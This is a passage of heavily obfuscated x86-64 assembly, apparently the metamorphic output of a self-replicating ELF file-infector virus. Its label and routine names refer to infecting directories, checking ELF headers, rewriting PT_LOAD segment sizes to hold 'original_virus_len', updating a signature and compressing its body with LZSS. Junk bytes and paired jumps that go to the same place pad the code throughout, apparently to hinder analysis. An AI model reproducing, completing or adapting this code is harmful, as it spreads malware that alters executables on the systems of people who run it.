..@OCWEn89Tyuis:
    sub         r1, r4
    jmp         ..@O8lvxn3sByEZ
..@kcGQjrcLk0MJ:
    push        rsi
    jmp         $+5
db 0x3a, 0xd8, 0xc5
    jb          ..@xAbwbUlc96O0
    jae         ..@xAbwbUlc96O0
..@Dy8ZXJWFYmrr:
    mov         rsi, rsi
    jmp         $+3
db 0x5e
    jmp         ..@DyKO7j6f8hY4
..@BEbUJHb6Po46:
    pop         rdi
    je          ..@miQitYRMRham
    jne         ..@miQitYRMRham
..@UuxXDY4SCFJ5:
    mov         rbp, rbp
    jl          ..@Pyk5NtK2MdQd
    jge         ..@Pyk5NtK2MdQd
..@ZzCQdJKIoxvY:
    pop         rcx
    jmp         $+5
db 0x2d, 0x91, 0x33
    jb          ..@pxgo9Jdq4frw
    jae         ..@pxgo9Jdq4frw
..@uIVgVGdpxGw6:
    rep         nop
    js          ..@418Kis9XC25E
    jns         ..@418Kis9XC25E
..@k1ANO8803roZ:
    mov         rax, 2
    jmp         $+4
db 0x0a, 0xd0
    jmp         $+5
db 0xf7, 0xe7, 0x9a
    jl          ..@LBWGAcYk14gM
    jge         ..@LBWGAcYk14gM
..@PjiAVf9PfOyn:
    test        rax, rax
    jb          ..@cxknVUPxvz7K
    jae         ..@cxknVUPxvz7K
..@QUdBDKcj8ZUy:
    mov         bx, WORD [rsp+_LZSSE_OFF.match_pos]
    jmp         ..@dQkKCKuKlKzY
..@xPJPTCNz3jCb:
    pop         rax
    jmp         ..@WWsA7tojkTnW
..@F5imSIFxvbPw:
    mov         rdx, rdx
    jmp         ..@OiKcFrmybQOE
..@r9AZ6jHW60AW:
    test        al, al
    js          ..@IqgP1b5aPDO3
    jns         ..@IqgP1b5aPDO3
..@ivSLS1Tmvrz9:
    push        rbx
    jmp         ..@eDSKtdgIWvQF
..@dfAF7h5kI5KJ:
    mov         r2, r5
    jmp         ..@iittYxDETp8t
..@U9ER4yxuWlYf:
    cmp         BYTE [r1], 0x39
    jl          ..@SU1RcjBoVQ5R
    jge         ..@SU1RcjBoVQ5R
..@sZ702yhxLzNo:
    xchg        rsp, rsp
    jmp         $+3
db 0x56
    jmp         ..@9ilBRxmwUc6Z
..@jRaDiEWAihv3:
    mov         rbp, rbp
    jb          ..@DaASiDJhzjjk
    jae         ..@DaASiDJhzjjk
..@nVvN4aP0FWGl:
%ifdef X86_64
    mov         rsi, original_virus_len+PADDING
%endif
    je          ..@aeRWYVfmQGzl
    jne         ..@aeRWYVfmQGzl
..@10JAaw3DjiEl:
    mov         rbp, rbp
    jmp         $+3
db 0x6c
    jl          ..@jCDFSoILCURA
    jge         ..@jCDFSoILCURA
..@ItaSIuHR6K1q:
    mov         QWORD [r2+p_h.p_memsz], r4
    jmp         ..@Ejau6tBkZ2Gx
..@KYfGV7CUL51E:
    mov         rcx, rcx
    jmp         $+3
db 0xed
    jmp         $+5
db 0xfb, 0xc0, 0x48
    js          ..@NzOUzt1mYOCE
    jns         ..@NzOUzt1mYOCE
..@oalzYxYtFFPv:
    mov         rbp, rbp
    jmp         ..@wFxocBU2YaRp
..@hxvoAc62Mc3o:
    jne         ..@4aKGEtYNITlk
    js          ..@Yj1MD5Wswl1j
    jns         ..@Yj1MD5Wswl1j
..@uceHq2KNGVxY:
    xchg        rdx, rdx
    jmp         $+5
db 0x27, 0xdb, 0x04
    jmp         $+3
db 0x93
    jb          ..@r8eLTKtXEzg7
    jae         ..@r8eLTKtXEzg7
..@avv2X1ZzuqED:
    mov         r1, r5
    jmp         $+4
db 0x9b, 0x38
    jmp         $+3
db 0xfc
    jmp         $+3
db 0x45
    js          ..@txPSja3WRcZF
    jns         ..@txPSja3WRcZF
..@GEKP7mSQGIGY:
    rep         nop
    jmp         $+4
db 0x36, 0xa1
    jmp         $+3
db 0xa6
    jmp         ..@CrYbw5GAppvD
..@pCYfo9DeVuds:
    cmp         BYTE [r1], DT_DIR
    jmp         ..@yxhoR6CI9Djg
..@WSQX4FjeLvZq:
    push        rdx
    jmp         $+4
db 0x46, 0x8a
    jmp         $+4
db 0x14, 0xe5
    jmp         ..@H676Vx7ebDzq
..@0I1ybR1YfOc6:
    pop         rsi
    jmp         $+3
db 0xac
    js          ..@6rFt0puU04xb
    jns         ..@6rFt0puU04xb
..@sPDjdKMOtIW4:
    pop         rsi
    jmp         $+3
db 0x5f
    js          ..@8DGt8E1cOmZ0
    jns         ..@8DGt8E1cOmZ0
..@1uEoMJElRorF:
    pop         rsi
    je          ..@bhkakU2ZVnYx
    jne         ..@bhkakU2ZVnYx
..@Tdoqoo9HP8Hz:
    pop         rbx
    jmp         $+3
db 0x7b
    jmp         $+4
db 0xd0, 0xaa
    jmp         ..@YYWqso4XJMJE
..@qiHI7ldbXIlV:
    push        rax
    jmp         $+3
db 0x74
    js          ..@jkinAWzMkA1K
    jns         ..@jkinAWzMkA1K
..@kvxyBBVN23xy:
    mov         r4, QWORD [rsp+_INFDIR_OFF.dirindex]
    jmp         ..@9sgbqA6Z33VF
..@lbr4whD6IuaF:
    pop         r1
    jmp         $+3
db 0x9d
    jmp         $+5
db 0x4d, 0x81, 0x1b
    jl          ..@mobD4lUIYrd6
    jge         ..@mobD4lUIYrd6
..@ZyMyfEmlaAfa:
    call        DYNPIEValidation
    jmp         $+3
db 0x7d
    js          ..@0JEL6V10p1Ka
    jns         ..@0JEL6V10p1Ka
..@ncSv5nqPNGKW:
    cmp         WORD [r1], '..'
    jmp         $+3
db 0xae
    jmp         ..@vfR6lKSIiSdw
..@95CuJThqJN0S:
    mov         rcx, rcx
    jmp         ..@RVl490eAHYFL
..@5SUhUJ63n3Ic:
    pop         rdx
    je          ..@WEqknAaB5QUc
    jne         ..@WEqknAaB5QUc
..@gsFBpDNhbm4h:
    mov         rsp, rsp
    jmp         $+3
db 0x2c
    js          ..@hxvoAc62Mc3o
    jns         ..@hxvoAc62Mc3o
..@NKdKq2f7ZenV:
    mov         rdi, rdi
    jmp         $+4
db 0x8b, 0x2f
    jb          ..@9SmCxZ3Y0O4f
    jae         ..@9SmCxZ3Y0O4f
..@uANW3oNfRz7l:
    mov         rax, rax
    jmp         ..@LEPVklxdqENe
..@ADLSMP2cnasL:
    call        UpdateSignature
    jmp         $+5
db 0xc3, 0xb1, 0xf1
    jmp         $+5
db 0xc0, 0x91, 0xa8
    js          ..@2xzwOmTPAnoF
    jns         ..@2xzwOmTPAnoF
..@Odnlk1yi0WMx:
    mov         rax, rax
    jmp         $+5
db 0x6e, 0x10, 0xe8
    jmp         ..@0NWLaFyjhUHB
..@t63wxKiMLbZh:
    push        rax
    jmp         $+4
db 0xd6, 0x80
    jmp         $+3
db 0x98
    jb          ..@MxjeCsc4CxyG
    jae         ..@MxjeCsc4CxyG
..@fh16ynzJIioV:
    mov         QWORD [rsp+_UPDATASIG_OFF.signaddr], r1
    jmp         $+5
db 0x27, 0xe7, 0x1f
    jmp         $+4
db 0x67, 0x5a
    jl          ..@U8VXANJIxsYT
    jge         ..@U8VXANJIxsYT
..@BymCZe7qj7sZ:
    mov         rax, SYS_GETUID
    jmp         $+3
db 0xdd
    jmp         ..@6yjQGocTdu6c
..@nrxTsqBvssY9:
    xchg        rax, rax
    jb          ..@o1PEkc9VjRWs
    jae         ..@o1PEkc9VjRWs
..@nOk5RrqMvado:
    mov         BYTE [r1], 0x00
    je          ..@JLGePTdQqW8R
    jne         ..@JLGePTdQqW8R
..@1wkJFAeJ6iMA:
    xor         r4, r4
    jmp         $+3
db 0x5a
    jl          ..@oQiz5Yz1b8w4
    jge         ..@oQiz5Yz1b8w4
..@kmIT772b388x:
    add         QWORD [rsp+_INFDIR_OFF.dirindex], rax
    jmp         ..@hs6HCQt2vabg
..@kiVJfGCJzusg:
    mov         rax, rax
    js          ..@ei0eOgpGpQva
    jns         ..@ei0eOgpGpQva
..@v8AxV0PmpSlZ:
%ifdef X86_32
    xchg        rax, rax
%endif
    jl          ..@RcKH2fvntAwN
    jge         ..@RcKH2fvntAwN
..@qMZKwHbgY1TG:
    test        al, al
    jmp         $+3
db 0xfd
    jb          ..@ws6lwIF69Ri7
    jae         ..@ws6lwIF69Ri7
..@RuFAj8tLEGw3:
    mov         WORD [rsp+_LZSSE_OFF.la_index], WINDOW_LENGTH-LOOKAHEAD_LENGTH
    jmp         $+5
db 0xff, 0x61, 0x99
    jl          ..@ivSLS1Tmvrz9
    jge         ..@ivSLS1Tmvrz9
..@WD8gRK2Nx6OF:
    xchg        rsp, rsp
    jl          ..@AfAECSqepSp7
    jge         ..@AfAECSqepSp7
..@ws6lwIF69Ri7:
    jnz         ..@Xcsq7B63ZiSR
    jmp         $+3
db 0xe6
    jb          ..@1HV4s4fiPC2L
    jae         ..@1HV4s4fiPC2L
..@Ejau6tBkZ2Gx:
    mov         QWORD [r2+p_h.p_align], PAGE_SIZE
    jmp         $+3
db 0x99
    js          ..@kbt4aDus6ULM
    jns         ..@kbt4aDus6ULM
..@nO9CJuJEuukq:
    jge         ..@jO5fGnCutNi9
    jb          ..@0Ll5xqOxypa2
    jae         ..@0Ll5xqOxypa2
..@5LKHrBJ7GjYO:
    push        rcx
    jmp         $+4
db 0x99, 0x82
    jmp         $+3
db 0xd8
    jl          ..@GzPVhtW6lb04
    jge         ..@GzPVhtW6lb04
..@KQV2sXBNO2kf:
    xor         rbx, rbx
    jmp         $+4
db 0x23, 0xfc
    jb          ..@ton2Lq8i6JZF
    jae         ..@ton2Lq8i6JZF
..@RVl490eAHYFL:
    mov         r1w, WORD [rsp+_UPDATASIG_OFF.index] 
    js          ..@XE5THHHRKTLd
    jns         ..@XE5THHHRKTLd
..@HBnYWYzmtF7f:
    call        AddSizeMappedFile
    jmp         ..@nby8BqjEmuz8
..@AQ0tjXqVPoyF:
    pop         rsi
    jmp         ..@e78U0gdof01Q
..@qZog9jwOz9kk:
    cmp         BYTE [r1], 0x30
    js          ..@ClFHwFKm8dMm
    jns         ..@ClFHwFKm8dMm
..@q0x9hyCuXScD:
    jne         ..@b57s9zdrznFN
    js          ..@cIiEvzuYgsVU
    jns         ..@cIiEvzuYgsVU
..@V3SFRo7W87v3:
    xchg        rdi, rdi
    js          ..@7y4SlUkcEshx
    jns         ..@7y4SlUkcEshx
..@rN75i6nmU55b:
    xchg        rsp, rsp
    jmp         $+4
db 0x01, 0x99
    je          ..@rXZAqegfSDX1
    jne         ..@rXZAqegfSDX1
..@6yjQGocTdu6c:
    syscall
    jmp         $+4
db 0x2e, 0x55
    je          ..@k1dBiMirLS2s
    jne         ..@k1dBiMirLS2s
..@glygROzBRHvw:
    pop         rsi
    jmp         ..@wlg8YuJZw8HQ
..@9co4TAImKhC4:
    jl          ..@4MUZWbGEmQ9C
    jmp         $+4
db 0xf7, 0x24
    jmp         ..@QT9nILgvqWsf
..@RLbJiS8GnXgy:
    push        rdi
    jmp         $+3
db 0x9e
    je          ..@cN3io4Sh9Tg9
    jne         ..@cN3io4Sh9Tg9
..@E50ACNWZS1kA:
%ifdef X86_32
    mov         esi, 0x22
%endif
    jmp         ..@fnPt19C2r7W5
..@gUJUTc4Pxjgh:
    mov         rax, rax
    js          ..@dzyVcE2RGJqQ
    jns         ..@dzyVcE2RGJqQ
..@BXuW1k3JcI67:
    cmp         BYTE [r1], 0x00
    jb          ..@Bs796Tb1zrkU
    jae         ..@Bs796Tb1zrkU
..@bgKNzL9mkQT3:
    lea         r1, [rsp+_PROC_OFF.dirbuf+r4]
    jmp         $+3
db 0x85
    jmp         $+5
db 0xa2, 0xf3, 0x60
    jmp         ..@QO4zB0COtU13
..@twKhG7Igiesg:
    pop         rcx
    js          ..@jX8aajT2UqVp
    jns         ..@jX8aajT2UqVp
..@LVlWElM052uo:
    pop         rsi
    jmp         ..@AaYIWdjOSMuu
..@KQprtr7yyNSu:
    mov         BYTE [rsp+_LZSSE_OFF.match_len], 0x0
    jmp         $+4
db 0xe2, 0x97
    jmp         ..@CnfMsPIm2dQM
..@fg4o1eYME83K:
    jmp         ..@BtyRjbjftHgI
    jb          ..@r2UmSb8nTjhn
    jae         ..@r2UmSb8nTjhn
..@hD6hPhjFw83L:
%ifdef X86_64
    mov         edx, 11b
%endif
    jmp         ..@TZuzkiNXJsA0
..@miQitYRMRham:
    pop         rsi
    jmp         $+5
db 0x8c, 0x31, 0x6c
    js          ..@sPtOuRh4gGWx
    jns         ..@sPtOuRh4gGWx
..@1NPaM9EXo5xt:
    lea         r1, [rsp+_INFDIR_OFF.buffer]
    jl          ..@abs00nf184ZV
    jge         ..@abs00nf184ZV
..@Ho31m0rksPNg:
%ifdef X86_32
    xor         ebp, ebp
%endif
    js          ..@nDF9W8AMvZ7F
    jns         ..@nDF9W8AMvZ7F
..@lvEPTtri0RHF:
    mov         r4d, DWORD [r1 + file.filefd]
    jl          ..@xUMZlFTcE1LG
    jge         ..@xUMZlFTcE1LG
UpdateSignature:
    jmp         ..@tloWc9SBuKe7
..@aqH2RsnX5Inn:
    pop         rdx
    jmp         $+4
db 0xa3, 0x92
    jl          ..@DM8jCA1IhA0P
    jge         ..@DM8jCA1IhA0P
..@0apm9TFE3asx:
    xchg        rsi, rsi
    js          ..@J6z1q16AJI7C
    jns         ..@J6z1q16AJI7C
..@ZtDdXMWk87wA:
    xchg        rdi, rdi
    jmp         $+3
db 0x7a
    jl          ..@OqRlU2gHhiKd
    jge         ..@OqRlU2gHhiKd
..@Cl20rxtEn41l:
    call        Strcpy
    jmp         $+4
db 0xec, 0x7f
    js          ..@vXQUTpx1Qp0P
    jns         ..@vXQUTpx1Qp0P
..@0st9U2Ds2Txr:
    push        rcx
    jmp         $+3
db 0x19
    js          ..@HO6Oqe42n8NI
    jns         ..@HO6Oqe42n8NI
..@im8YXGP5kXMb:
    pop         rdx
    js          ..@uwjNTTdd4sDs
    jns         ..@uwjNTTdd4sDs
..@3icppYfdskwG:
    xchg        rsi, rsi
    jmp         $+5
db 0x94, 0x9f, 0x65
    jmp         $+5
db 0x46, 0xf0, 0x36
    jmp         ..@L9HAhz8CcVg2
..@vTeka7a5mi11:
    push        rbx
    jmp         ..@d0joBdqUoFkx
..@hoEhlElYyyQL:
    mov         QWORD [rsp+_INFDIR_OFF.dirnread], rax
    js          ..@ueyBKJUkvY0r
    jns         ..@ueyBKJUkvY0r
..@rdDKEMjuIm45:
    push        rbx
    jmp         ..@qFf0j59B4HRP
..@GRAGBU1gMiA6:
    mov         rcx, rcx
    js          ..@voSGV6SCLmgH
    jns         ..@voSGV6SCLmgH
..@45UUEHzu2TEu:
    mov         rbp, rbp
    jb          ..@wX6mCry1vZ23
    jae         ..@wX6mCry1vZ23
..@OXYQCNMr4Ye9:
    mov         rsp, rsp
    jmp         $+5
db 0x9a, 0x32, 0xa7
    jmp         ..@NEnC1qb7DLzW
..@V3RPPSRyhyNE:
    push        rbx
    jmp         $+4
db 0x00, 0xa9
    je          ..@0KF4SrUsepv2
    jne         ..@0KF4SrUsepv2
..@uFjo5x2wsPPc:
    pop         rcx
    js          ..@zS6P2feU6rXC
    jns         ..@zS6P2feU6rXC
..@DEMLzZ7OPauk:
%ifdef X86_64
    push        rax
%endif
    je          ..@LvQ94ihMy7vh
    jne         ..@LvQ94ihMy7vh
..@MIq2KKXyBECM:
    call        MapFile
    jb          ..@xf43K4Hx5WKc
    jae         ..@xf43K4Hx5WKc
..@G46qxwCIub70:
    mov         ax, WORD [rsp+_LZSSE_OFF.buffersize]
    jmp         $+4
db 0xfd, 0x39
    je          ..@GTY0vu7RbldY
    jne         ..@GTY0vu7RbldY
..@G2QyQXGsAnDm:
%ifdef X86_64
    push        rcx
%endif
    jmp         $+3
db 0x18
    jl          ..@RpVVLk3ho9Ia
    jge         ..@RpVVLk3ho9Ia
..@7vVPQRgSACj6:
    mov         rax, SYS_MUNMAP
    jmp         $+5
db 0x14, 0x04, 0x47
    jb          ..@2a7BIRO1Po7l
    jae         ..@2a7BIRO1Po7l
..@6rMpcPSpt3fw:
    xor         rax, rax
    jb          ..@kzIdCCvrFbGr
    jae         ..@kzIdCCvrFbGr
..@8FtcHhY7OnKb:
    jl          ..@7Y2a5QrQEWMe
    jmp         $+4
db 0x39, 0xa2
    jmp         ..@f62FCV7zF4T6
..@Owlt5q4Yo6yq:
    movzx       rax, BYTE [r2]
    jmp         $+5
db 0xbd, 0xaf, 0x9e
    jmp         $+4
db 0x77, 0x30
    jmp         ..@qK5KPdD3pZhz
..@LrsPHGEdXlFk:
    mov         r1, m6
    jmp         ..@rhsLBfS2sgki
..@ZVi1lIxmf3vb:
    mov         QWORD [r5+file.fileptr], 0x00
    js          ..@8Pyyv94txOVr
    jns         ..@8Pyyv94txOVr
..@w6BwIdpt4ZOO:
    xchg        rbx, rbx
    jmp         $+5
db 0x78, 0xc0, 0xcc
    js          ..@Czm3mpwoAheB
    jns         ..@Czm3mpwoAheB
..@KTgcw0a8juDE:
    mov         rdi, rdi
    jmp         $+5
db 0x6c, 0x5f, 0x52
    jmp         ..@11nZPFYafhAS
..@zomRZ2VSSvGX:
    mov         rcx, r3
    jb          ..@LZsZA2n8N6bN
    jae         ..@LZsZA2n8N6bN
..@4aKGEtYNITlk:
    sub         ebx, 1
    jb          ..@kDQPqHguryA5
    jae         ..@kDQPqHguryA5
..@j4W02HAyb04s:
    xor         rax, rax
    jmp         $+3
db 0x39
    jmp         ..@DCEdePmmn8vf
..@rhsLBfS2sgki:
    mov         r2, original_virus_len+PADDING
    jmp         $+4
db 0x4d, 0x06
    jmp         $+3
db 0x34
    jmp         ..@P2lExKKIAChR
..@BGIc7neughyL:
    pop         r5
    jmp         $+4
db 0x13, 0xba
    js          ..@Ln82MNbWpNIc
    jns         ..@Ln82MNbWpNIc
..@AutnemTLb2WA:
    jmp         ..@WV8vaHBRlyZR
    je          ..@8NCjFeuoEttB
    jne         ..@8NCjFeuoEttB
..@cKGdMw0yz5q6:
    ret
    js          ..@2Ty1EDO8Yk3l
    jns         ..@2Ty1EDO8Yk3l
..@SiakyLf03pMx:
    mov         rdi, rdi
    jmp         $+4
db 0x93, 0x50
    js          ..@IRMWFl3EPUTP
    jns         ..@IRMWFl3EPUTP
..@R3tFLnN2IFB0:
    xchg        rsp, rsp
    jmp         ..@tJMw4GMPtRU4
..@Mu0IzFOXCYt4:
    push        rsi
    jmp         ..@G5STAXR3HiT2
..@4OKK9mSyLJ7W:
    mov         ax, dx
    jmp         $+3
db 0xf7
    jb          ..@roYuaKMCPAHj
    jae         ..@roYuaKMCPAHj
..@jMiiXURLveTs:
    push        r1
    jb          ..@uOny6NAV4TUn
    jae         ..@uOny6NAV4TUn
..@to97fUTpIZnf:
    xchg        rsp, rsp
    js          ..@17OGrr8UvBiY
    jns         ..@17OGrr8UvBiY
..@1tupbQcyi0Rw:
    push        rdi
    jmp         $+3
db 0x20
    jmp         $+5
db 0x58, 0x44, 0x98
    js          ..@iV8XkfhTIW3p
    jns         ..@iV8XkfhTIW3p
..@j9UdT6kvBl0r:
    xchg        rsi, rsi
    jmp         ..@lKiuk8ik8w5S
..@0MjFcyxsPY9I:
    jnz         ..@54MQlWU9zcxF
    jb          ..@6ERyQxjHYUuD
    jae         ..@6ERyQxjHYUuD
..@FCIS0PTS0gC9:
    rep         movsb
    jmp         ..@yBw2zMctgQzQ
..@E9ExgWVnwN02:
    jmp         ..@DxBnvS7E3dT0
    jl          ..@bFZPW1z368cQ
    jge         ..@bFZPW1z368cQ
..@gKAtkyUEUkXW:
    mov         rdx, rdx
    jb          ..@8DLUAi4FAlRf
    jae         ..@8DLUAi4FAlRf
..@mK1LNeSeIZ9q:
    xchg        rdi, rdi
    js          ..@RJ67dfH94Zgf
    jns         ..@RJ67dfH94Zgf
..@2amaBz2cvyu5:
    mov         r2, signature_len
    jmp         $+3
db 0xc8
    jmp         $+3
db 0x43
    jmp         $+3
db 0x65
    js          ..@whJriTWpBNlq
    jns         ..@whJriTWpBNlq
..@2AxZMVi6tc1O:
    mov         QWORD [rsp+_LZSSE_OFF.saveoutptr], r3
    jmp         $+5
db 0x22, 0x03, 0x75
    jmp         $+4
db 0x6c, 0x38
    jb          ..@K5WU3ETuWA1s
    jae         ..@K5WU3ETuWA1s
..@0FTPbRCP6RNv:
    mov         rbp, rbp
    jmp         $+3
db 0xeb
    je          ..@PQlyYmm79a4K
    jne         ..@PQlyYmm79a4K
..@8vqQ1GKl5PjW:
    mov         DWORD [rsp+_PROC_OFF.filefd], eax
    jmp         $+4
db 0xa1, 0xd7
    js          ..@nPqSpApTNOMp
    jns         ..@nPqSpApTNOMp
..@h2gOedMrn6z3:
    pop         rbx
    jl          ..@6rMpcPSpt3fw
    jge         ..@6rMpcPSpt3fw
..@ofHyr04rYA1o:
    syscall
    jmp         ..@ZPowBvikLXOr
..@AEgL837nFr05:
    mov         ecx, PADDING
    jmp         $+4
db 0xc4, 0xc4
    jb          ..@fvdL2ky5f2aB
    jae         ..@fvdL2ky5f2aB
..@rXKB66n7UkG4:
    jz          ..@EyxGAQrOMs5D
    je          ..@tPSp7QJKFdCE
    jne         ..@tPSp7QJKFdCE
..@Lr3lTw53v5F8:
    xor         rcx, rcx
    jmp         $+4
db 0x58, 0x97
    jl          ..@awCLuiENF57z
    jge         ..@awCLuiENF57z
..@VZrjkpfJa1Qy:
    xor         rax, rax
    jb          ..@Lr3lTw53v5F8
    jae         ..@Lr3lTw53v5F8
..@RV1rrvKS3PxF:
    push        rcx
    jmp         $+4
db 0x60, 0xc3
    jmp         $+3
db 0xbc
    jb          ..@mR4BT1IHwn1S
    jae         ..@mR4BT1IHwn1S
..@CSmonEmfyjV1:
    pop         r4
    jb          ..@BGIc7neughyL
    jae         ..@BGIc7neughyL
..@eP6nEUZVSYdp:
%ifdef X86_64
    push        rsi
%endif
    jmp         $+5
db 0xb7, 0x8d, 0x48
    jmp         ..@Bsy8DtvAxi0e
..@W5jaGzQkAmNM:
    mov         m7, rdi
    jmp         $+5
db 0x34, 0x96, 0x42
    jmp         ..@SUYb3aOiqv1z
..@NEOLRWUQm0Qh:
    xchg        rdx, rdx
    jmp         $+4
db 0x86, 0x38
    js          ..@Fk7qc2ysqsvV
    jns         ..@Fk7qc2ysqsvV
..@fn1FZTXZt4Mf:
    add         rsi, QWORD [rdi+s_h.sh_offset]
    jmp         ..@BtyRjbjftHgI
..@4OPMIHIjZWOO:
    mov         rbp, rbp
    jmp         $+4
db 0x8b, 0xa6
    jmp         $+3
db 0xdc
    jl          ..@3H2Y1Cx2R8sq
    jge         ..@3H2Y1Cx2R8sq
..@88VlSmOjkQ6I:
%ifdef X86_64
    pop         rbx
%endif
    jmp         ..@RdYNeecj6YHX
..@lNl9lHkF4roF:
%ifdef X86_64
    pop         rsi
%endif
    jmp         ..@kbK9ZCj3pigF
..@i2cerblToEnf:
    xor         rax, rax
    jmp         $+3
db 0x46
    jmp         ..@dtQ1bzqJzQvr
..@os1YyASpfoax:
    push        rcx
    jmp         $+5
db 0x2d, 0x87, 0x12
    jmp         ..@UW7NGinq3rmK
..@i8Apw07geBXV:
    or          bx, dx
    jmp         $+4
db 0x1d, 0x11
    jl          ..@tGGU9X3zGCzx
    jge         ..@tGGU9X3zGCzx
..@vCclZPPYsh0X:
    pop         rcx
    je          ..@WTgF5iy9Lc0e
    jne         ..@WTgF5iy9Lc0e
..@BB5ZktimiPIJ:
    mov         QWORD [r2+p_h.p_filesz], r4
    jmp         $+5
db 0x83, 0xa8, 0xc9
    jmp         ..@diqYNkLyKzLr
..@VuXaNcJ5etRr:
%ifdef X86_32
    mov         edi, r1
%endif
    jmp         $+3
db 0xae
    js          ..@cedRKO7eAXOR
    jns         ..@cedRKO7eAXOR
..@OcoSxpH9Yr1c:
    mov         DWORD [r2], PT_LOAD
    jmp         ..@iCMICcFxB6zm
..@QwEwu4ol0ADi:
    call        Strcpy
    jmp         $+5
db 0x96, 0xd2, 0x08
    jmp         ..@VnjymbvmsxVS
..@XppS2PngbU8H:
    pop         rax
    jb          ..@L4BZCcA9i1NE
    jae         ..@L4BZCcA9i1NE
..@Ps7vIwtfprxm:
    push        rcx
    jmp         ..@5LKHrBJ7GjYO
..@2xzwOmTPAnoF:
    mov         r1, m6
    jmp         $+4
db 0x85, 0x16
    jmp         ..@H1lvKt5U4OuQ
..@fEgJxtNIQTLd:
    push        rcx
    jmp         $+4
db 0xc9, 0x7d
    jmp         ..@SdJlxDwjmIYR
..@y51wtZy3xDzT:
    jmp         ..@oQiz5Yz1b8w4
    jmp         $+4
db 0x48, 0xa9
    jmp         $+5
db 0xea, 0x6d, 0x33
    jb          ..@PgjwUCnAvskZ
    jae         ..@PgjwUCnAvskZ
..@NceWYP8dRS1B:
    push        rsi
    jmp         $+4
db 0xd3, 0xb3
    jmp         ..@yUKy6FD3sMo0
..@EnCgKOm8GDwT:
    mov         rax, rax
    js          ..@IQL87N8cP2Xt
    jns         ..@IQL87N8cP2Xt
..@71rs9mXcJdAs:
    xchg        rdi, rdi
    jmp         $+3
db 0x97
    jmp         $+4
db 0x51, 0x1b
    jmp         ..@rTA7EQQGoeuD
..@KrFpXvlzyGOS:
    xchg        rsp, rsp
    jl          ..@uYHlVKz6MDFO
    jge         ..@uYHlVKz6MDFO
..@LpPnfucCbYjC:
    add         r4, r3
    jmp         $+3
db 0x81
    js          ..@9QggRpRYFsNM
    jns         ..@9QggRpRYFsNM
..@S9Ap61lvADgS:
    pop         r1
    jmp         $+3
db 0x9e
    jmp         $+3
db 0x24
    jmp         ..@xr75ocXBkvfM
..@O9aOfBNQrf7v:
    push        rbx
    jmp         ..@hWfdks39yCdr
..@tJMw4GMPtRU4:
    xchg        rcx, rcx
    jmp         ..@t63wxKiMLbZh
..@WcwS73rgNVMq:
    test        eax, eax
    jmp         $+4
db 0x6c, 0xe9
    jmp         ..@tguo28WC9vPV
..@bnKQBDzehNiH:
    pop         rax
    jmp         $+3
db 0x31
    jl          ..@qGa0FBoXxwla
    jge         ..@qGa0FBoXxwla
..@ei0eOgpGpQva:
    xchg        rdi, rdi
    jl          ..@TVQ6aTYJB1co
    jge         ..@TVQ6aTYJB1co
..@xEApgFfInGZ9:
    xchg        rsi, rsi
    jmp         $+3
db 0xc1
    jl          ..@Slx826222n4p
    jge         ..@Slx826222n4p
..@ncMgxm67rxUv:
    syscall
    jmp         ..@h5dUAt2CPk9L
..@f5Z7hn1QxYvk:
    push        r1
    jmp         $+5
db 0x38, 0xd2, 0x28
    jmp         $+4
db 0x62, 0x49
    jmp         $+3
db 0xd1
    je          ..@jVxY62m0SNwT
    jne         ..@jVxY62m0SNwT
..@DCEdePmmn8vf:
    mov         QWORD [rsp+_DYNPIE_OFF.ptr], r1
    jmp         $+5
db 0x85, 0x2a, 0xce
    jmp         $+4
db 0xf7, 0x3b
    jmp         $+4
db 0x49, 0x41
    je          ..@UY8abEIIInII
    jne         ..@UY8abEIIInII
..@bwTd7QyAO7DD:
    mov         eax, 0x20
    jmp         $+4
db 0xf5, 0x2a
    jmp         ..@yzaezV3bLDlf
..@ZSAPiurRSrJ3:
    mov         rdi, rdi
    jmp         $+5
db 0x80, 0xad, 0x23
    js          ..@FBnPjCkxByVw
    jns         ..@FBnPjCkxByVw
..@jjNovgAOSPxg:
    je          ..@kvxyBBVN23xy
    jmp         ..@1NPaM9EXo5xt
..@TMosaXpMxZQ6:
    cmp         DWORD [r1], 0x464c457f
    jmp         ..@BffhNn4nDdKp
..@uabgFRn2FwL4:
    ret
    jmp         FileValidation
..@BsWS0ZldLG1w:
    push        rdx
    je          ..@LYMp21vJO9Lc
    jne         ..@LYMp21vJO9Lc
..@dnreW6vEBR6a:
    pop         rsi
    jmp         $+4
db 0x8c, 0x51
    jmp         ..@5hKuZITBCp83
..@Hgzj0ncJunam:
    push        rbx
    jmp         $+3
db 0xc2
    jmp         $+3
db 0xfc
    jmp         ..@zGseY6CCO5fo
..@Aye4afQskxLl:
    mov         QWORD [rsp+_LZSSE_OFF.length], r2
    jmp         $+4
db 0x73, 0x01
    jb          ..@BoefwdXMUhmB
    jae         ..@BoefwdXMUhmB
..@DDgGudm7p8To:
%ifdef X86_64
    xchg        rax, rax
%endif
    jmp         $+4
db 0x97, 0x80
    jmp         ..@gYD595nS0Bb4
..@eDSKtdgIWvQF:
    pop         rbx
    jl          ..@3KaFYUHEPjZp
    jge         ..@3KaFYUHEPjZp
..@BhnwjmheJ58l:
    mov         rax, rax
    jmp         ..@u6kJtkiUL4D1
..@fy0gZUe9usZg:
    mov         r1, r5
    jmp         $+5
db 0x5e, 0xfc, 0x71
    jmp         ..@WjhxTmPYxRBm
..@xsI7a58JXGdZ:
    push        rbx
    jmp         $+5
db 0xc0, 0x74, 0xb9
    jmp         $+3
db 0x72
    jl          ..@7RkQz7e6YQDL
    jge         ..@7RkQz7e6YQDL
..@fTtYqwbhH6am:
    pop         rax
    jl          ..@wm0bIBHdYDaB
    jge         ..@wm0bIBHdYDaB
..@qJUvkpzqnrdj:
    pop         rbx
    je          ..@koKjsDKLHddU
    jne         ..@koKjsDKLHddU
..@5qMp7U1aVYhx:
    xchg        rbx, rbx
    js          ..@n06iEakdcy2O
    jns         ..@n06iEakdcy2O
..@7RQhosmNxeuH:
    shl         edx, POSITION_BITS+LENGTH_BITS
    je          ..@QUdBDKcj8ZUy
    jne         ..@QUdBDKcj8ZUy
..@K5WU3ETuWA1s:
    mov         BYTE [rsp+_LZSSE_OFF.mask], 10000000b
    jmp         $+5
db 0x89, 0x03, 0x17
    jmp         $+4
db 0x0e, 0x2b
    jmp         ..@QrASg3mjEhGY
..@0wk3nXLwnxmY:
    rep         nop
    jmp         $+4
db 0x1f, 0x02
    jmp         ..@xEApgFfInGZ9
..@7aAA2wuvsucJ:
    pop         rbx
    jmp         ..@cGMew5VjG5bs
..@sPtOuRh4gGWx:
    cmp         r1, 0x00
    jmp         $+3
